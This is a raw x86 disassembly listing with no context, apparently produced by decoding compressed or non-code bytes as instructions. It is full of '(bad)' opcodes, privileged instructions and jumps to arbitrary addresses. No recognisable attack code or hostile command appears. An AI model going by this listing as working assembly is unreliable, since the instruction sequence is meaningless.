  430b93:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430b99:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430b9f:	add    BYTE PTR [ebx],al
  430ba1:	mov    eax,eax
  430ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430ba4:	inc    ebp
  430ba5:	dec    ebp
  430ba6:	xor    DWORD PTR [ebx],esi
  430ba8:	pushf  
  430ba9:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430baf:	rdmsr  
  430bb1:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430bb9:	sar    eax,1
  430bbb:	rol    BYTE PTR [ebp+0x5],1
  430bbe:	xor    eax,DWORD PTR [ebp+0x3]
  430bc1:	jmp    0x430bae
  430bc3:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430bc9:	xor    eax,DWORD PTR [ebp+0x33]
  430bcc:	mov    eax,DWORD PTR [ebx]
  430bce:	rol    BYTE PTR [ebx],1
  430bd0:	test   BYTE PTR [edi],cl
  430bd2:	fwait
  430bd3:	shl    DWORD PTR [edx],0x4d
  430bd6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430bdc:	xor    edx,eax
  430bde:	add    eax,DWORD PTR ds:0xeb4d45e0
  430be4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430bea:	add    BYTE PTR [ebx],dh
  430bec:	inc    ebp
  430bed:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430bf3:	rdpmc  
  430bf5:	rol    DWORD PTR [ebx],0x4d
  430bf8:	loopne 0x430b85
  430bfa:	push   ebp
  430bfb:	in     al,dx
  430bfc:	mov    cl,dl
  430bfe:	adc    eax,edx
  430c00:	jb     0x430c07
  430c02:	add    BYTE PTR [ebp+0x45],al
  430c05:	jmp    0x430b92
  430c07:	mov    ebx,eax
  430c09:	test   al,0xcb
  430c0b:	dec    ebp
  430c0c:	dec    ebp
  430c0d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430c13:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430c19:	dec    ebp
  430c1a:	mov    al,0x8b
  430c1c:	dec    ebp
  430c1d:	in     al,dx
  430c1e:	xor    edx,ecx
  430c20:	xor    edx,eax
  430c22:	add    eax,DWORD PTR [ebp+0x3]
  430c25:	jbe    0x430c36
  430c27:	mov    eax,ecx
  430c29:	test   al,0x45
  430c2b:	dec    ebp
  430c2c:	mov    DWORD PTR [ebx],esi
  430c2e:	loopne 0x430c63
  430c30:	inc    ebp
  430c31:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430c37:	rol    esi,0x45
  430c3a:	scas   eax,DWORD PTR es:[edi]
  430c3b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430c41:	mov    eax,ecx
  430c43:	hlt    
  430c44:	dec    ebp
  430c45:	inc    ebp
  430c46:	mov    eax,edi
  430c48:	loopne 0x430c22
  430c4a:	retf   
  430c4b:	test   esi,ecx
  430c4d:	clc    
  430c4e:	scas   eax,DWORD PTR es:[edi]
  430c4f:	inc    ebp
  430c50:	mov    eax,edi
  430c52:	fdiv   st,st(0)
  430c54:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430c5a:	fwait
  430c5b:	xor    esi,DWORD PTR [edx]
  430c5d:	pushf  
  430c5e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430c64:	inc    esi
  430c66:	mov    ebp,DWORD PTR [eax-0x10]
  430c69:	inc    ebp
  430c6a:	dec    ebp
  430c6b:	xor    esi,DWORD PTR [ebx]
  430c6d:	add    eax,DWORD PTR [ebx]
  430c6f:	loopne 0x430c80
  430c71:	dec    ebp
  430c72:	ror    DWORD PTR [edx+0x7233084d],0x3
  430c79:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430c7f:	lock fwait
  430c81:	ret    
  430c82:	xor    al,BYTE PTR [ebp-0x77]
  430c85:	mov    esi,esp
  430c87:	rol    BYTE PTR [ebp-0x7c],1
  430c8a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430c90:	call   edi
  430c92:	enter  0x4d45,0x8b
  430c96:	mov    esi,eax
  430c98:	fmul   st(3),st
  430c9a:	push   ebp
  430c9b:	dec    ebp
  430c9c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430ca2:	ret    0xc19b
  430ca5:	xor    al,BYTE PTR [esi-0x280276]
  430cab:	dec    ebp
  430cac:	jne    0x430ce1
  430cae:	mov    eax,DWORD PTR [ebx]
  430cb0:	cld    
  430cb1:	loopne 0x430c63
  430cb3:	push   ebp
  430cb4:	add    DWORD PTR [eax+0x72851100],ecx
  430cba:	inc    DWORD PTR [eax]
  430cbc:	inc    DWORD PTR [ebp-0x75]
  430cbf:	mov    edi,esp
  430cc1:	lock add bl,0x1
  430cc5:	retf   
  430cc6:	add    dh,al
  430cc8:	xor    dh,cl
  430cca:	inc    ebp
  430ccb:	scas   eax,DWORD PTR es:[edi]
  430ccc:	mov    eax,DWORD PTR [ebx]
  430cce:	shl    al,0x0
  430cd1:	inc    ebp
  430cd2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430cd8:	call   0x462010
  430cdd:	ud0    eax,ecx
  430ce0:	adc    al,0x4d
  430ce2:	inc    ebp
  430ce3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430ce9:	lock push 0x338055
  430cef:	add    eax,DWORD PTR [eax]
  430cf1:	ud0    ecx,edx
  430cf4:	sbb    BYTE PTR [ebp+0x5e],dl
  430cf7:	xor    ecx,ecx
  430cf9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430d00:	push   ecx
  430d01:	add    BYTE PTR [ebp-0x38],cl
  430d04:	mov    DWORD PTR [esi-0x740004],eax
  430d0a:	cld    
  430d0b:	inc    ebp
  430d0c:	jmp    0x430c99
  430d0e:	mov    esp,esp
  430d10:	mov    ebx,eax
  430d12:	mov    eax,esi
  430d14:	clc    
  430d15:	scas   eax,DWORD PTR es:[edi]
  430d16:	icebp  
  430d17:	mov    esi,DWORD PTR [ebp-0x28]
  430d1a:	(bad)  
  430d1b:	retf   
  430d1c:	or     ecx,eax
  430d1e:	(bad)  
  430d1f:	dec    ebp
  430d20:	pop    es
  430d21:	(bad)  
  430d22:	(bad)  
  430d23:	or     BYTE PTR [esi],al
  430d25:	jb     0x430ced
  430d27:	add    BYTE PTR [ebx],al
  430d29:	inc    ebp
  430d2a:	(bad)  
  430d2b:	mov    ecx,DWORD PTR [edx]
  430d2d:	fadd   st(6),st
  430d2f:	ret    
  430d30:	add    ah,BYTE PTR [ebp-0x37]
  430d33:	int    0x55
  430d35:	sub    ebp,esp
  430d37:	add    edx,DWORD PTR [ecx-0x14]
  430d3a:	inc    ebp
  430d3b:	inc    ebp
  430d3c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430d42:	cld    
  430d43:	(bad)  
  430d44:	(bad)  
  430d45:	scas   eax,DWORD PTR es:[edi]
  430d46:	loopne 0x430d83
  430d48:	mov    DWORD PTR [edi],ecx
  430d4a:	mov    ebp,ebp
  430d4c:	clc    
  430d4d:	push   eax
  430d4f:	push   DWORD PTR [ebp-0x4]
  430d52:	mov    BYTE PTR [ebp+0xa],0xff
  430d56:	(bad)  
  430d57:	int3   
  430d58:	or     BYTE PTR [eax],al
  430d5a:	(bad)  
  430d5b:	lea    eax,[edi]
  430d5d:	ins    BYTE PTR es:[edi],dx
  430d5e:	(bad)  
  430d5f:	inc    DWORD PTR [ecx]
  430d61:	push   eax
  430d62:	mov    BYTE PTR [ebp+0x9],0x8b
  430d66:	leave  
  430d67:	les    edx,FWORD PTR [ebp+0x0]
  430d6a:	in     al,dx
  430d6b:	call   DWORD PTR [ecx-0x75]
  430d6e:	inc    ebp
  430d6f:	cld    
  430d70:	mov    DWORD PTR [eax+0x8b01fc],eax
  430d76:	cld    
  430d77:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430d7d:	pop    es
  430d7e:	mov    eax,DWORD PTR [eax]
  430d80:	clc    
  430d81:	test   eax,esi
  430d83:	je     0x430dfa
  430d85:	mov    eax,esi
  430d87:	cld    
  430d88:	add    al,0x80
  430d8a:	add    WORD PTR [ecx+0x0],ax
  430d8e:	fiadd  DWORD PTR [eax]
  430d90:	mov    BYTE PTR [eax],0x3d
  430d93:	push   0xffffffc3
  430d95:	push   edi
  430d96:	mov    edx,DWORD PTR [eax+0x51]
  430d99:	pop    edi
  430d9a:	lea    ebx,[ebx-0x8]
  430d9d:	ret    0x45
  430da0:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430da6:	xchg   eax,edi
  430da8:	mov    DWORD PTR [ebp-0x75],ecx
  430dab:	push   esi
  430dac:	clc    
  430dad:	jne    0x430d7f
  430daf:	mov    ecx,0xf8450b0b
  430db4:	(bad)  
  430db5:	push   cs
  430db6:	or     BYTE PTR [ebp-0x3a],dh
  430db9:	cmp    eax,DWORD PTR [ecx]
  430dbb:	pop    esi
  430dbc:	(bad)  
  430dbd:	or     al,0x5
  430dbf:	inc    eax
  430dc0:	leave  
  430dc1:	jmp    0x40cf:0x25564204
  430dc8:	leave  
  430dc9:	in     eax,dx
  430dca:	inc    DWORD PTR [eax-0x75]
  430dcd:	fimul  DWORD PTR [ebx-0x228139be]
  430dd3:	inc    eax
  430dd4:	nop
  430dd5:	loopne 0x430dd6
  430dd7:	ret    
  430dd8:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430dde:	add    eax,0xff45e8f8
  430de3:	push   esi
  430de4:	push   DWORD PTR [ebp-0x39]
  430de7:	mov    eax,0x7edda46
  430dec:	or     al,0x6
  430dee:	push   DWORD PTR [ebp-0x3a]
  430df1:	cmp    eax,DWORD PTR [edx]
  430df3:	pop    esi
  430df4:	ret    
  430df5:	or     al,0x56
  430df7:	inc    ecx
  430df8:	push   ebp
  430df9:	jle    0x430de7
  430dfb:	inc    edx
  430dfc:	inc    ebp
  430dfd:	int    0x1
  430dff:	inc    ecx
  430e00:	sub    BYTE PTR ds:0xe77541fc,ah
  430e06:	add    DWORD PTR [edx+0x1c],eax
  430e09:	retf   0xc38b
  430e0c:	adc    al,0x8b
  430e0e:	xchg   edx,eax
  430e0f:	push   ecx
  430e10:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430e16:	rcl    DWORD PTR [esi-0x9],cl
  430e19:	jne    0x430e6b
  430e1b:	mov    eax,0x7c80ece
  430e20:	rol    DWORD PTR [esi],cl
  430e22:	div    DWORD PTR [ebp+0x50]
  430e25:	cmp    ecx,edx
  430e27:	pop    esi
  430e28:	dec    BYTE PTR [edx]
  430e2a:	in     al,dx
  430e2b:	inc    edx
  430e2c:	sub    esp,ecx
  430e2e:	inc    eax
  430e2f:	(bad)  
  430e30:	push   eax
  430e31:	add    edx,DWORD PTR [eax-0x1f]
  430e34:	push   edi
  430e35:	add    dh,dh
  430e37:	leave  
  430e38:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430e3c:	add    BYTE PTR [ecx+0x0],dl
  430e3f:	inc    ebp
  430e40:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430e46:	add    BYTE PTR [eax-0x7fbf448],bh
  430e4c:	add    al,0x2
  430e4e:	jmp    0x57eb9a8
  430e53:	jne    0x430e3d
  430e55:	mov    eax,DWORD PTR [edx]
  430e57:	or     BYTE PTR [eax],al
  430e59:	inc    ecx
  430e5a:	stc    
  430e5b:	in     eax,dx
  430e5c:	ss inc eax
  430e5e:	aas    
  430e5f:	out    0x7d,eax
  430e61:	inc    ecx
  430e62:	mov    ebp,ecx
  430e64:	lock ret 0x7d
  430e68:	and    ecx,DWORD PTR [ebx-0x171777]
  430e6e:	add    bh,bh
  430e70:	aad    0xd7
  430e72:	add    dh,cl
  430e74:	clts   
  430e76:	(bad)  
  430e77:	call   0xffce0d7c
  430e7c:	hlt    
  430e7d:	iret   
  430e7e:	jge    0x430e56
  430e80:	rol    DWORD PTR [esi-0x80],cl
  430e83:	jmp    0x1c5d90
  430e88:	out    dx,al
  430e89:	mov    eax,DWORD PTR [ebx]
  430e8b:	(bad)  
  430e8c:	pop    esi
  430e8d:	push   es
  430e8e:	cmp    al,0xe8
  430e90:	sar    edi,0x8
  430e93:	inc    DWORD PTR [edi]
  430e95:	inc    esi
  430e96:	(bad)  
  430e97:	loopne 0x430f17
  430e99:	push   edi
  430e9a:	push   cs
  430e9b:	push   ebx
  430e9c:	add    BYTE PTR [ebx+0x24008b56],cl
  430ea2:	add    BYTE PTR [ebp+0x50],al
  430ea5:	push   eax
  430ea6:	add    DWORD PTR [ebx+0x757d1834],ecx
  430eac:	sub    edx,DWORD PTR [esi-0x24]
  430eaf:	jne    0x430e67
  430eb1:	lods   eax,DWORD PTR ds:[esi]
  430eb2:	mov    edx,DWORD PTR [edx-0x34]
  430eb5:	dec    esi
  430eb6:	out    0x83,eax
  430eb8:	into   
  430eb9:	push   edi
  430ebb:	loopne 0x430e8b
  430ebd:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430ec1:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430ec8:	rol    DWORD PTR [edx],0x8
  430ecb:	mov    esp,ecx
  430ecd:	cmp    DWORD PTR [ebx],0xc
  430ed0:	mov    esi,0x5001c0
  430ed5:	push   eax
  430ed6:	push   cs
  430ed7:	push   eax
  430ed8:	(bad)  
  430ed9:	sub    edx,edi
  430edb:	push   esi
  430edc:	adc    al,0xcb
  430ede:	ins    DWORD PTR es:[edi],dx
  430edf:	mov    eax,0x203e8
  430ee4:	add    al,ah
  430ee6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430eed:	add    dh,al
  430eef:	add    ah,ch
  430ef1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430ef7:	pop    ecx
  430ef8:	or     eax,ebx
  430efa:	cli    
  430efb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430f01:	lea    ebp,[ebx]
  430f03:	mov    edx,DWORD PTR [edx-0x4]
  430f06:	dec    ecx
  430f07:	inc    ebp
  430f08:	shr    BYTE PTR [ebx],0x4b
  430f0b:	and    al,0x0
  430f0d:	(bad)  
  430f0e:	jne    0x430f55
  430f10:	pop    eax
  430f11:	mov    al,0x5a
  430f13:	call   0x1421172
  430f18:	and    al,0x85
  430f1a:	push   edx
  430f1b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430f1f:	dec    ebp
  430f20:	mov    cl,0x23
  430f22:	jmp    0x430f10
  430f24:	mov    al,0xe7
  430f26:	call   0x1391214
  430f2b:	shr    DWORD PTR [eax+ebx*2],cl
  430f2e:	lock (bad) 
  430f30:	adc    eax,0x757f008d
  430f35:	out    0x58,eax
  430f37:	cmp    al,0x7
  430f39:	pop    edx
  430f3a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430f41:	push   ecx
  430f42:	cld    
  430f43:	mov    esi,0x3b0175
  430f48:	and    al,0xb0
  430f4a:	xor    BYTE PTR [edx+0x1],0x8b
  430f4e:	add    ah,bh
  430f50:	mov    edi,DWORD PTR [ebp-0x4]
  430f53:	psubsw mm7,QWORD PTR [edi]
  430f56:	add    DWORD PTR [ebp+0x0],ebp
  430f59:	rcr    eax,1
  430f5b:	mov    edi,ecx
  430f5d:	and    eax,DWORD PTR [eax]
  430f5f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430f65:	call   0x130124e
  430f6a:	add    al,cl
  430f6c:	mov    ebp,esi
  430f6e:	aam    0x83
  430f70:	or     DWORD PTR [ecx],eax
  430f72:	jne    0x430f65
  430f74:	mov    eax,DWORD PTR [eax]
  430f76:	aam    0x0
  430f78:	dec    ebp
  430f79:	jne    0x430f06
  430f7b:	cmp    ebx,eax
  430f7d:	jb     0x430fcc
  430f7f:	jmp    0x430f0c
  430f81:	mov    ebx,esp
  430f83:	int3   
  430f84:	dec    ebp
  430f85:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f8c:	mov    edx,0x8b0a8b
  430f91:	cmp    ecx,DWORD PTR [eax]
  430f93:	jb     0x430f6c
  430f95:	pop    edx
  430f96:	push   edi
  430f97:	cli    
  430f98:	pop    es
  430f99:	mov    eax,ecx
  430f9b:	jb     0x430f9f
  430f9d:	add    DWORD PTR [ebx],0xa
  430fa0:	mov    eax,DWORD PTR [ebx]
  430fa2:	int3   
  430fa3:	add    bh,BYTE PTR [esi+0x75d10006]
  430fa9:	jmp    0x430f36
  430fab:	mov    al,0xe8
  430fad:	call   0x104122f
  430fb2:	add    edx,DWORD PTR [ecx+ecx*8]
  430fb5:	pop    edi
  430fb6:	or     BYTE PTR [ecx-0x73],bl
  430fb9:	pop    ecx
  430fba:	inc    edi
  430fbb:	xor    al,0xeb
  430fbd:	push   ecx
  430fbe:	mov    edi,DWORD PTR [edx+0xc506cc]
  430fc4:	call   0xb210c9
  430fc9:	int3   
  430fca:	sbb    BYTE PTR [esi],ch
  430fcc:	inc    ebp
  430fcd:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430fd3:	call   0x9c1242
  430fd8:	or     BYTE PTR [ebx-0x73],dl
  430fdb:	cmp    al,0x47
  430fdd:	mov    al,0x1
  430fdf:	jb     0x430fe1
  430fe1:	mov    al,0x10
  430fe3:	push   eax
  430fe4:	add    al,0x75
  430fe6:	add    BYTE PTR [ebx],ch
  430fe8:	add    ebx,esp
  430fea:	int3   
  430feb:	jne    0x430ffd
  430fed:	movsx  edx,cl
  430ff0:	add    DWORD PTR [eax],eax
  430ff2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430ff9:	mov    gs,edi
  430ffb:	add    BYTE PTR [eax-0x50],ch
  430ffe:	add    al,ch
  431000:	mov    eax,DWORD PTR [ecx]
  431002:	sub    eax,DWORD PTR [eax]
  431004:	jb     0x43107b
  431006:	add    DWORD PTR [esp+eiz*8-0x50],esi
  43100a:	jge    0x430ff4
  43100c:	add    al,0x1
  43100e:	add    DWORD PTR [eax],0x0
  431011:	jne    0x431013
  431013:	je     0x43105a
  431015:	mov    eax,DWORD PTR [edi]
  431017:	ror    BYTE PTR [ebp+0x4d],1
  43101a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431021:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431027:	mov    DWORD PTR [ebx],ebp
  431029:	fadd   DWORD PTR [eax+0x75]
  43102c:	inc    eax
  43102d:	pop    eax
  43102e:	lea    ebx,[ecx+0x4f]
  431031:	push   0xb1000003
  431036:	out    dx,eax
  431037:	add    ebp,DWORD PTR [edx+edx*2]
  43103a:	add    BYTE PTR [ebx+ecx*4],bh
  43103d:	mov    ch,BYTE PTR [ebx]
  43103f:	jb     0x4310b3
  431041:	add    al,0x89
  431043:	push   eax
  431044:	call   0x842b5db6
  431049:	add    DWORD PTR [eax+eax*1],eax
  43104c:	jae    0x431062
  43104e:	icebp  
  43104f:	inc    ebp
  431050:	mov    eax,DWORD PTR gs:[ecx]
  431053:	int3   
  431054:	out    dx,al
  431055:	loopne 0x4310a4
  431057:	sub    eax,DWORD PTR [edx]
  431059:	push   0xffffff83
  43105b:	pop    esi
  43105c:	push   cs
  43105d:	jl     0x431078
  43105f:	add    al,0xaf
  431061:	xor    eax,0x832b6d00
  431066:	mov    eax,DWORD PTR [edx]
  431068:	rcr    BYTE PTR [ebp+0x754500dc],cl
  43106e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431074:	inc    ebp
  431075:	shr    ebx,0x3
  431078:	or     DWORD PTR [eax],0x4
  43107b:	push   0xffffffa5
  43107d:	pop    esi
  43107e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431085:	jmp    0x4310e4
  431087:	mov    edi,0xff0272
  43108c:	fdivr  QWORD PTR [ebp+0x5d]
  43108f:	push   0x4e
  431091:	pop    ecx
  431092:	call   0x435497
  431097:	mov    DWORD PTR [ebx],eax
  431099:	in     al,0xc8
  43109b:	rol    BYTE PTR [ebp-0x75],0xc1
  43109f:	call   0xad1280
  4310a4:	pop    esi
  4310a5:	enter  0xceff,0x8b
  4310a9:	repz mov ecx,DWORD PTR [ebp-0x34]
  4310ad:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4310b4:	je     0x4310b6
  4310b6:	or     DWORD PTR [ebx-0x74183b24],eax
  4310bc:	jne    0x4310a2
  4310be:	jmp    0x4310b9
  4310c0:	push   DWORD PTR [edx-0x24]
  4310c3:	push   0x4d
  4310c5:	pop    ecx
  4310c6:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4310ca:	jge    0x4310d2
  4310cc:	mov    eax,eax
  4310ce:	sub    ebp,DWORD PTR [edx+0x24]
  4310d1:	pop    esi
  4310d2:	inc    ebp
  4310d3:	mov    esp,0x8b6077
  4310d8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4310de:	lods   al,BYTE PTR ds:[esi]
  4310df:	add    BYTE PTR [ebx],bh
  4310e1:	enter  0xce73,0x49
  4310e5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4310ed:	stc    
  4310ee:	jge    0x431162
  4310f0:	jnp    0xdd42945f
  4310f6:	call   0xc611cc
  4310fb:	fadd   st(0),st
  4310fd:	dec    esi
  4310fe:	ins    BYTE PTR es:[edi],dx
  4310ff:	stc    
  431100:	cmp    al,0x73
  431102:	push   ebp
  431103:	mov    eax,0xf8028b
  431108:	jne    0x4310cb
  43110a:	mov    esi,ecx
  43110c:	mov    esp,DWORD PTR [ebp+0x2c]
  43110f:	add    edi,DWORD PTR [ebp-0x24]
  431112:	sub    esp,eax
  431114:	and    al,0x45
  431116:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  43111c:	sbb    al,0xee
  43111e:	pop    esi
  43111f:	call   0x83114f
  431124:	fsubr  st,st(3)
  431126:	sti    
  431127:	add    BYTE PTR gs:[ecx],bh
  43112a:	add    eax,esp
  43112c:	add    DWORD PTR [esi],eax
  43112e:	rol    DWORD PTR [ebp+0x8],0x29
  431132:	mov    esp,eax
  431134:	clc    
  431135:	jne    0x4311ac
  431137:	mov    eax,0x8b0673
  43113c:	loopne 0x431183
  43113e:	loopne 0x4310c9
  431140:	lods   al,BYTE PTR ds:[esi]
  431141:	int3   
  431142:	inc    ebp
  431143:	mov    DWORD PTR gs:[eax+edi*8],eax
  431147:	add    al,0xc3
  431149:	sub    ecx,DWORD PTR [ebp+0x47]
  43114c:	(bad)  
  43114e:	shr    BYTE PTR [ebp-0x1f],0xe8
  431152:	add    eax,DWORD PTR [eax]
  431154:	call   0x644d259
  431159:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43115f:	dec    esi
  431160:	ins    DWORD PTR es:[edi],dx
  431161:	in     al,dx
  431162:	lea    eax,[eax]
  431164:	inc    ebp
  431165:	inc    ebp
  431166:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  43116c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431176:	and    al,0xdc
  431178:	ror    DWORD PTR [edx+0x24],0xf7
  43117c:	or     BYTE PTR [ebp+0x4c],dh
  43117f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431183:	stos   BYTE PTR es:[edi],al
  431184:	adc    edx,edi
  431186:	inc    esp
  431187:	add    edi,DWORD PTR [eax]
  431189:	jne    0x43116e
  43118b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431191:	cmp    ecx,DWORD PTR [edi]
  431193:	sub    BYTE PTR [ebp-0x7e],dl
  431196:	sar    ebp,0xb
  431199:	jmp    FWORD PTR [edi+0x2400392a]
  43119f:	sub    esi,DWORD PTR [ebx-0x73]
  4311a2:	mov    esp,DWORD PTR [ecx+edi*4]
  4311a5:	mov    ecx,DWORD PTR [eax]
  4311a7:	and    BYTE PTR [eax],al
  4311a9:	jne    0x431175
  4311ab:	sub    ebp,ecx
  4311ad:	sbb    BYTE PTR [esi+0x32],ah
  4311b0:	dec    ebp
  4311b1:	push   ebp
  4311b2:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4311b8:	ret    
  4311b9:	mov    edx,ebp
  4311bb:	leave  
  4311bc:	sub    DWORD PTR [esi+0x24],ebx
  4311bf:	ret    0x2b
  4311c2:	pop    ax
  4311c4:	push   ebp
  4311c5:	rol    BYTE PTR [ebx],0xeb
  4311c8:	add    DWORD PTR [ecx+0x6c0001],0x40
  4311cf:	jb     0x431226
  4311d1:	ret    
  4311d2:	in     al,dx
  4311d3:	jecxz  0x431160
  4311d5:	push   esi
  4311d6:	xchg   esp,eax
  4311d7:	jne    0x4311d9
  4311d9:	cmp    edx,DWORD PTR [esi+0x1c]
  4311dc:	jne    0x4311c2
  4311de:	mov    eax,DWORD PTR [ebp-0x77]
  4311e1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4311e8:	mov    esi,DWORD PTR [ebp-0x75]
  4311eb:	pop    esi
  4311ec:	nop
  4311ed:	mov    eax,DWORD PTR [eax]
  4311ef:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4311f5:	add    al,0x0
  4311f7:	inc    ebp
  4311f8:	mov    eax,DWORD PTR [ebx]
  4311fa:	mov    ebp,ebx
  4311fc:	cmp    al,0xf
  4311fe:	or     al,al
  431200:	inc    ebp
  431201:	inc    ebp
  431202:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431208:	cld    
  431209:	add    BYTE PTR [edi+0x546c16c0],dh
  43120f:	add    BYTE PTR [ecx-0x5],dl
  431212:	add    eax,0x17200
  431217:	sbb    al,0x85
  431219:	dec    esp
  43121a:	je     0x431254
  43121c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  431220:	add    BYTE PTR [ebx],bh
  431222:	(bad)  
  431223:	and    al,0x32
  431225:	jae    0x4311c3
  431227:	mov    cl,cl
  431229:	inc    DWORD PTR [esp]
  43122c:	push   ebp
  43122d:	shr    esp,0x8
  431230:	in     al,dx
  431231:	push   esp
  431232:	add    DWORD PTR [eax],esp
  431234:	add    bl,cl
  431236:	inc    ebp
  431237:	mov    bh,0x89
  431239:	add    ah,bh
  43123b:	jmp    0xca752185
  431240:	pushf  
  431241:	dec    esp
  431242:	mov    edx,0xf8178520
  431247:	fst    DWORD PTR [ebp+0x0]
  43124a:	mov    BYTE PTR [eax],0xc4
  43124d:	sub    edx,DWORD PTR [ebx-0x3f]
  431250:	inc    ebp
  431251:	add    eax,0xc601da
  431256:	mov    al,0xc6
  431259:	ins    BYTE PTR es:[edi],dx
  43125a:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  431261:	dec    esp
  431262:	jmp    DWORD PTR [eax]
  431264:	inc    ebp
  431265:	fnstcw WORD PTR [esi+0x29]
  431268:	test   BYTE PTR [eax],0xc8
  43126b:	rol    BYTE PTR [eax],0xc0
  43126e:	lea    ecx,[ebp-0x3cf0dbcb]
  431274:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  43127a:	inc    esi
  43127b:	add    DWORD PTR [eax],ebx
  43127d:	add    dh,bh
  43127f:	mov    esi,DWORD PTR [edx+0x8]
  431282:	(bad)  
  431283:	fdiv   QWORD PTR ss:[ecx]
  431286:	(bad)  
  431287:	mov    bl,ch
  431289:	add    esi,eax
  43128b:	add    dh,bl
  43128d:	or     esi,eax
  43128f:	mov    dl,0xdf
  431291:	add    esi,eax
  431293:	add    al,ah
  431295:	push   cs
  431296:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43129d:	or     BYTE PTR [ebx],dh
  43129f:	dec    ecx
  4312a0:	lea    eax,[ebx]
  4312a2:	xor    eax,0x18fc0fc7
  4312a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4312a8:	repz clc 
  4312aa:	add    eax,DWORD PTR [ebp+0x46]
  4312ad:	prefetcht0 BYTE PTR [ecx-0x2]
  4312b1:	xor    eax,0x7c60872
  4312b6:	mov    esp,0xbd32c69b
  4312bb:	pop    esi
  4312bc:	mov    cl,0xbe
  4312bf:	or     al,0xc6
  4312c1:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4312c8:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4312cf:	add    dh,al
  4312d1:	mov    eax,ebx
  4312d3:	xor    DWORD PTR [ebx],0x35008dbc
  4312d9:	mov    ecx,DWORD PTR [edi]
  4312db:	sbb    al,0x18
  4312dd:	inc    ebp
  4312de:	xrelease mov DWORD PTR [ebx],0x188546f4
  4312e5:	clc    
  4312e6:	(bad)  
  4312e7:	xor    DWORD PTR [edx-0x64],esi
  4312ea:	lea    ecx,[ecx+0x45ffe838]
  4312f0:	mov    ecx,ebx
  4312f2:	fadd   st,st(6)
  4312f4:	dec    ebp
  4312f5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4312fb:	out    0x1,eax
  4312fd:	inc    ebp
  4312fe:	lea    ebp,ds:0xc8ffc6ff
  431304:	enter  0xa33,0xc6
  431308:	push   ebp
  431309:	leave  
  43130a:	(bad)  
  43130b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431311:	add    BYTE PTR [ebp+0x44],al
  431314:	mov    eax,esp
  431316:	mov    WORD PTR [esi+0x46398300],?
  43131c:	psubusw mm4,QWORD PTR [esi-0x78]
  431320:	add    BYTE PTR [ebx-0x1303f975],al
  431326:	add    BYTE PTR [ebp+0x1],0xeb
  43132a:	add    BYTE PTR [ebp+0x38],al
  43132d:	in     eax,dx
  43132e:	inc    ebp
  43132f:	inc    ebp
  431330:	mov    ebx,ebx
  431332:	add    BYTE PTR [ebp+0x0],0xec
  431336:	mov    DWORD PTR [ebp-0x41],eax
  431339:	sub    eax,0x2c00454e
  43133e:	ins    DWORD PTR es:[edi],dx
  43133f:	inc    ebp
  431340:	add    BYTE PTR [esi+0x66],bh
